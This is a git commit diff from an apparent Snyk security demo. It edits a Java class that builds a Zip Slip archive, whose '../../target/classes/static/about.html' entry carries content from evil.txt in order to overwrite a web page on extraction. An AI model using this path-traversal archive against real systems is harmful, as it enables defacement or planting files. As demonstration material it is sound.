7e1189c3c5cdee7ca4de2d847f9e6005e3d3a373
brianvermeer <->
2019-05-30 10:35:07 +0200

    Basline for Jetbrains demo

--- src/main/java/io/snyk/demo/ZipCreator.java
+++ src/main/java/io/snyk/demo/ZipCreator.java
@@ -5,24 +5,22 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Paths;
-import java.util.List;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
 
-public class Test {
+public class ZipCreator {
 
 
     public static void main(String[] args) throws IOException {
         String content = new String(Files.readAllBytes(Paths.get("evil.txt")));
-        System.out.println(content);
 
 
-        File f = new File("evil.zip");
+        File f = new File("jetbrains-demo.zip");
         ZipOutputStream out = new ZipOutputStream(new FileOutputStream(f));
         insertZipEntry(out, "good.txt", "This is a good textfile");
         insertZipEntry(out,
                 "../../target/classes/static/about.html",
-                "<html><h1>About<h1></html>");
+                content);
         out.close();
     }
 
@@ -37,22 +35,6 @@ public class Test {
         out.write(data, 0, data.length);
         out.closeEntry();
     }
-
-
-//    public void createZipFile(String zipFileName, List<File> files) throws IOException{
-//        File zipFile = new File(zipFileName);
-//        ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(zipFile));
-//
-//        files.forEach(file -> insertIntoZipFile(zipOutputStream, file));
-//        zipOutputStream.close();
-//
-//    }
-//
-//    private void insertIntoZipFile(ZipOutputStream zipOutputStream, File file) {
-//        ZipEntry entry = new ZipEntry(file.getName());
-//
-//
-//    }
 
 
 }
